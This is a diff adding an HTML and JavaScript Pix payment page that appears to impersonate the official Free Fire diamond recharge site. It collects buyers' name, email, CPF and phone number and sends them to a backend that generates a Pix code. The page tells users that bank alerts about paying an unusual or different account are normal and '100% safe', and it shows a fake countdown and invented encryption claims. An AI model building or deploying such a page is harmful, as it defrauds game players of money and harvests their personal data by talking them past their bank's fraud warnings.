@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Pagar com Pix - Free Fire</title>
+  <link rel="icon" type="image/x-icon" href="/assets.recargajogo.com.br/gop/mshop/www/live/static/favicon.ico">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+
+    body {
+      background: #f5f5f5;
+      color: #111;
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ---- Header ---- */
+    .header {
+      background: #fff;
+      border-bottom: 1px solid #e5e7eb;
+      padding: 0 16px;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+    .header-back {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      text-decoration: none;
+      color: #374151;
+      font-size: 14px;
+      font-weight: 500;
+    }
+    .header-title { font-size: 15px; font-weight: 700; color: #111; }
+    .header-safe { display: flex; align-items: center; gap: 4px; font-size: 12px; color: #16a34a; font-weight: 600; }
+
+    /* ---- Wrapper ---- */
+    .page { max-width: 520px; margin: 0 auto; padding: 16px 16px 40px; }
+
+    /* ---- Estado: Loading ---- */
+    #state-loading {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 60vh;
+      gap: 16px;
+    }
+    .spinner {
+      width: 44px; height: 44px;
+      border: 4px solid #e5e7eb;
+      border-top-color: #e53935;
+      border-radius: 50%;
+      animation: spin 0.85s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text { font-size: 15px; font-weight: 600; color: #374151; }
+    .loading-sub { font-size: 13px; color: #9ca3af; }
+
+    /* ---- Estado: Erro ---- */
+    #state-error {
+      display: none;
+      text-align: center;
+      padding: 48px 24px;
+    }
+    .error-icon { font-size: 52px; margin-bottom: 16px; }
+    .error-title { font-size: 20px; font-weight: 800; color: #b91c1c; margin-bottom: 8px; }
+    .error-msg { font-size: 14px; color: #6b7280; margin-bottom: 24px; line-height: 1.6; }
+    .btn-retry {
+      display: inline-block;
+      background: #e53935;
+      color: #fff;
+      border: none;
+      padding: 12px 28px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 15px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    /* ---- Estado: PIX Gerado ---- */
+    #state-pix { display: none; }
+
+    /* Resumo do pedido */
+    .order-card {
+      background: #fff;
+      border-radius: 12px;
+      border: 1px solid #e5e7eb;
+      padding: 16px 18px;
+      margin-bottom: 14px;
+    }
+    .order-card-title {
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: #9ca3af;
+      font-weight: 700;
+      margin-bottom: 10px;
+    }
+    .order-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+      padding: 5px 0;
+    }
+    .order-row:not(:last-child) { border-bottom: 1px solid #f3f4f6; }
+    .order-row-label { color: #6b7280; }
+    .order-row-value { font-weight: 600; color: #111; }
+    .order-row-value.price { color: #e53935; font-size: 18px; font-weight: 800; }
+
+    /* Aviso de expiração */
+    .timer-bar {
+      background: #fff7ed;
+      border: 1px solid #fed7aa;
+      border-radius: 10px;
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 14px;
+    }
+    .timer-icon { font-size: 18px; flex-shrink: 0; }
+    .timer-text { font-size: 13px; font-weight: 600; color: #c2410c; }
+
+    /* Card PIX principal */
+    .pix-card {
+      background: #fff;
+      border-radius: 12px;
+      border: 1px solid #e5e7eb;
+      padding: 20px 18px;
+      text-align: center;
+      margin-bottom: 14px;
+    }
+    .pix-card-title {
+      font-size: 15px;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 4px;
+    }
+    .pix-card-sub {
+      font-size: 13px;
+      color: #6b7280;
+      margin-bottom: 20px;
+    }
+    .qr-wrapper {
+      display: inline-block;
+      padding: 14px;
+      background: #fff;
+      border: 2px solid #e5e7eb;
+      border-radius: 12px;
+      margin-bottom: 18px;
+    }
+    #pix-qr { width: 170px; height: 170px; display: block; }
+
+    .copy-area {
+      background: #f8fafc;
+      border: 1.5px dashed #cbd5e1;
+      border-radius: 8px;
+      padding: 10px 12px;
+      font-family: "SF Mono", "Fira Code", monospace, sans-serif;
+      font-size: 11px;
+      color: #374151;
+      word-break: break-all;
+      text-align: left;
+      max-height: 68px;
+      overflow-y: auto;
+      line-height: 1.5;
+      margin-bottom: 12px;
+      cursor: pointer;
+    }
+
+    .btn-copy {
+      width: 100%;
+      background: #111827;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 13px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: background 0.15s;
+    }
+    .btn-copy:hover { background: #1f2937; }
+    .btn-copy.copied { background: #16a34a; }
+
+    .copy-ok {
+      display: none;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      font-size: 13px;
+      font-weight: 700;
+      color: #16a34a;
+      margin-top: 8px;
+    }
+
+    /* Passos */
+    .steps-card {
+      background: #fff;
+      border-radius: 12px;
+      border: 1px solid #e5e7eb;
+      padding: 18px 18px;
+      margin-bottom: 14px;
+    }
+    .steps-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+    .step {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      padding: 10px 0;
+    }
+    .step:not(:last-child) { border-bottom: 1px solid #f3f4f6; }
+    .step-num {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: #e53935;
+      color: #fff;
+      font-size: 12px;
+      font-weight: 800;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+    .step-body { flex: 1; }
+    .step-label { font-size: 14px; font-weight: 700; color: #111; margin-bottom: 2px; }
+    .step-desc { font-size: 13px; color: #6b7280; line-height: 1.5; }
+
+    /* Aviso de segurança */
+    .security-notice {
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      border-radius: 10px;
+      padding: 14px 16px;
+      margin-bottom: 14px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+    .security-icon { font-size: 20px; flex-shrink: 0; margin-top: 1px; }
+    .security-title { font-size: 13px; font-weight: 700; color: #15803d; margin-bottom: 3px; }
+    .security-text { font-size: 12.5px; color: #374151; line-height: 1.55; }
+
+    /* Aviso de popup do banco */
+    .bank-notice {
+      background: #fffbeb;
+      border: 1px solid #fde68a;
+      border-radius: 10px;
+      padding: 14px 16px;
+      margin-bottom: 14px;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+    .bank-notice-icon { font-size: 20px; flex-shrink: 0; margin-top: 1px; }
+    .bank-notice-title { font-size: 13px; font-weight: 700; color: #92400e; margin-bottom: 3px; }
+    .bank-notice-text { font-size: 12.5px; color: #374151; line-height: 1.55; }
+
+    /* Estado: Pago */
+    #state-paid {
+      display: none;
+      text-align: center;
+      padding: 60px 24px 40px;
+    }
+    .paid-icon {
+      width: 72px; height: 72px;
+      background: #dcfce7;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      margin: 0 auto 20px;
+    }
+    .paid-title { font-size: 22px; font-weight: 800; color: #15803d; margin-bottom: 8px; }
+    .paid-sub { font-size: 14px; color: #6b7280; line-height: 1.6; margin-bottom: 28px; }
+    .btn-home {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: #16a34a;
+      color: #fff;
+      border: none;
+      padding: 13px 28px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 15px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header style="background:#fff; border-bottom:1px solid #e5e7eb;">
+    <div class="header">
+      <a href="/checkout/" class="header-back">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+        Voltar
+      </a>
+      <span class="header-title">Pagar com Pix</span>
+      <span class="header-safe">
+        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        Seguro
+      </span>
+    </div>
+  </header>
+
+  <div class="page">
+
+    <!-- Estado: Carregando -->
+    <div id="state-loading">
+      <div class="spinner"></div>
+      <div>
+        <div class="loading-text">Gerando seu Pix...</div>
+        <div class="loading-sub" style="text-align:center; margin-top:4px;">Aguarde um instante</div>
+      </div>
+    </div>
+
+    <!-- Estado: Erro -->
+    <div id="state-error">
+      <div class="error-icon">⚠️</div>
+      <div class="error-title">Não foi possível gerar o Pix</div>
+      <div class="error-msg" id="error-detail">Ocorreu um erro ao processar seu pagamento. Tente novamente.</div>
+      <a href="/checkout/" class="btn-retry">← Tentar novamente</a>
+    </div>
+
+    <!-- Estado: PIX Gerado -->
+    <div id="state-pix">
+
+      <!-- Resumo do pedido -->
+      <div class="order-card">
+        <div class="order-card-title">Resumo do pedido</div>
+        <div class="order-row">
+          <span class="order-row-label">Produto</span>
+          <span class="order-row-value" id="sum-product">310 + 62 Diamantes</span>
+        </div>
+        <div class="order-row">
+          <span class="order-row-label">Método</span>
+          <span class="order-row-value" style="display:flex; align-items:center; gap:5px;">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#32BCAD"><circle cx="12" cy="12" r="10"/><path d="M12 7v5l3 3" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>
+            Pix
+          </span>
+        </div>
+        <div class="order-row">
+          <span class="order-row-label">Total</span>
+          <span class="order-row-value price" id="sum-price">R$ 15,00</span>
+        </div>
+      </div>
+
+      <!-- Timer -->
+      <div class="timer-bar">
+        <span class="timer-icon">⏳</span>
+        <span class="timer-text" id="timer-label">Pague em até <strong id="timer-count">15:00</strong></span>
+      </div>
+
+      <!-- QR Code + Código Pix -->
+      <div class="pix-card">
+        <div class="pix-card-title">Escaneie o QR Code</div>
+        <div class="pix-card-sub">Ou copie o código Pix abaixo para colar no seu banco</div>
+
+        <div class="qr-wrapper">
+          <img id="pix-qr" src="" alt="QR Code Pix">
+        </div>
+
+        <div class="copy-area" id="pix-code" onclick="copyPix()">Aguardando código...</div>
+
+        <button class="btn-copy" id="btn-copy" onclick="copyPix()">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+          Copiar Código Pix
+        </button>
+
+        <div class="copy-ok" id="copy-ok">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+          Código copiado com sucesso!
+        </div>
+      </div>
+
+      <!-- Passo a passo -->
+      <div class="steps-card">
+        <div class="steps-title">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#e53935" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+          Como pagar com Pix
+        </div>
+
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-label">Abra seu banco ou carteira digital</div>
+            <div class="step-desc">Acesse o app do seu banco (Nubank, Bradesco, Itaú, PicPay, etc.) ou qualquer app com Pix.</div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-label">Escolha pagar com Pix</div>
+            <div class="step-desc">Procure a opção <strong>"Pix"</strong> ou <strong>"Pagar com Pix"</strong> no menu do seu banco.</div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-label">Escaneie ou cole o código</div>
+            <div class="step-desc">Use a câmera para escanear o QR Code acima, ou escolha <strong>"Pix Copia e Cola"</strong> e cole o código copiado.</div>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <div class="step-label">Confirme o valor e finalize</div>
+            <div class="step-desc">Verifique o valor de <strong id="step-price">R$ 15,00</strong> e confirme o pagamento. Os diamantes serão creditados automaticamente!</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Aviso: popup do banco -->
+      <div class="bank-notice">
+        <span class="bank-notice-icon">⚠️</span>
+        <div>
+          <div class="bank-notice-title">Pode aparecer um aviso no seu banco — é normal!</div>
+          <div class="bank-notice-text">
+            Alguns bancos exibem alertas como <em>"Você está pagando para uma conta diferente"</em> ou <em>"Pagamento não usual"</em>. Isso acontece porque o processamento é feito via adquirente parceira. <strong>A transação é 100% segura</strong> — pode confirmar normalmente.
+          </div>
+        </div>
+      </div>
+
+      <!-- Aviso: segurança -->
+      <div class="security-notice">
+        <span class="security-icon">🔒</span>
+        <div>
+          <div class="security-title">Pagamento seguro e criptografado</div>
+          <div class="security-text">Sua transação é processada com criptografia de ponta a ponta. Não compartilhe o código Pix com terceiros. Os diamantes serão creditados automaticamente após a confirmação do pagamento.</div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Estado: Pago -->
+    <div id="state-paid">
+      <div class="paid-icon">✅</div>
+      <div class="paid-title">Pagamento Confirmado!</div>
+      <div class="paid-sub">Seu pagamento foi recebido com sucesso.<br>Os diamantes serão creditados em breve na sua conta Free Fire.</div>
+      <a href="/recargajogo.com.br/index.render.html" class="btn-home">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+        Voltar ao início
+      </a>
+    </div>
+
+  </div>
+
+  <script>
+    function showState(id) {
+      ['state-loading', 'state-error', 'state-pix', 'state-paid'].forEach(s => {
+        const el = document.getElementById(s);
+        if (el) el.style.display = (s === id) ? 'block' : 'none';
+      });
+      if (id === 'state-loading') {
+        document.getElementById('state-loading').style.display = 'flex';
+      }
+    }
+
+    // --- Countdown (fixo 30min visual) ---
+    let timerSec = 30 * 60;
+    let timerInterval = null;
+    function startTimer() {
+      clearInterval(timerInterval);
+      timerInterval = setInterval(function() {
+        timerSec = Math.max(0, timerSec - 1);
+        const m = String(Math.floor(timerSec / 60)).padStart(2, '0');
+        const s = String(timerSec % 60).padStart(2, '0');
+        const el = document.getElementById('timer-count');
+        if (el) el.textContent = m + ':' + s;
+        if (timerSec === 0) clearInterval(timerInterval);
+      }, 1000);
+    }
+
+    // --- Copy Pix ---
+    function copyPix() {
+      const code = document.getElementById('pix-code').textContent.trim();
+      if (!code || code === 'Aguardando código...') return;
+      navigator.clipboard.writeText(code).then(() => {
+        const btn = document.getElementById('btn-copy');
+        const ok = document.getElementById('copy-ok');
+        btn.classList.add('copied');
+        btn.innerHTML = '<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Código Copiado!';
+        ok.style.display = 'flex';
+        setTimeout(() => {
+          btn.classList.remove('copied');
+          btn.innerHTML = '<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copiar Código Pix';
+          ok.style.display = 'none';
+        }, 3500);
+      }).catch(() => {
+        // fallback
+        const ta = document.createElement('textarea');
+        ta.value = code;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        ta.remove();
+      });
+    }
+
+    // --- Polling de Status ---
+    let pollInterval = null;
+    function startPolling(transactionId) {
+      clearInterval(pollInterval);
+      pollInterval = setInterval(async function() {
+        try {
+          const r = await fetch('/api/pix/status?id=' + transactionId);
+          const data = await r.json();
+          if (data.status === 'approved') {
+            clearInterval(pollInterval);
+            clearInterval(timerInterval);
+            showState('state-paid');
+          }
+        } catch(e) {}
+      }, 5000);
+    }
+
+    // --- Inicializar: ler dados do localStorage e chamar API ---
+    async function init() {
+      showState('state-loading');
+
+      const item = localStorage.getItem('selected_item') || '310 + 62 Diamantes';
+      const price = localStorage.getItem('selected_price') || 'R$ 15,00';
+      const nome = localStorage.getItem('pix_nome') || '';
+      const email = localStorage.getItem('pix_email') || '';
+      const cpf = localStorage.getItem('pix_cpf') || '';
+      const telefone = localStorage.getItem('pix_telefone') || '';
+
+      // Verificar se temos dados suficientes
+      if (!nome || !email) {
+        window.location.href = '/checkout/';
+        return;
+      }
+
+      // Preencher resumo
+      document.getElementById('sum-product').textContent = item;
+      document.getElementById('sum-price').textContent = price;
+      document.getElementById('step-price').textContent = price;
+
+      try {
+        const response = await fetch('/api/pix', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            nome, email, cpf, telefone,
+            valor: price,
+            descricao: item,
+            referencia: 'FF-' + Date.now()
+          })
+        });
+
+        const result = await response.json();
+
+        if (result.ok && result.qr_code) {
+          // Preencher QR code
+          const qrImg = document.getElementById('pix-qr');
+          if (result.qr_code_base64) {
+            qrImg.src = result.qr_code_base64;
+          } else {
+            qrImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(result.qr_code);
+          }
+
+          document.getElementById('pix-code').textContent = result.qr_code;
+
+          showState('state-pix');
+          startTimer();
+
+          if (result.transaction_id) {
+            startPolling(result.transaction_id);
+          }
+        } else {
+          showState('state-error');
+          const msg = (result.detalhe && (result.detalhe.message || JSON.stringify(result.detalhe))) || result.error || 'Tente novamente.';
+          document.getElementById('error-detail').textContent = msg;
+        }
+      } catch(err) {
+        showState('state-error');
+        document.getElementById('error-detail').textContent = 'Erro de conexão. Verifique sua internet e tente novamente.';
+      }
+    }
+
+    init();
+  </script>
+</body>
+</html>
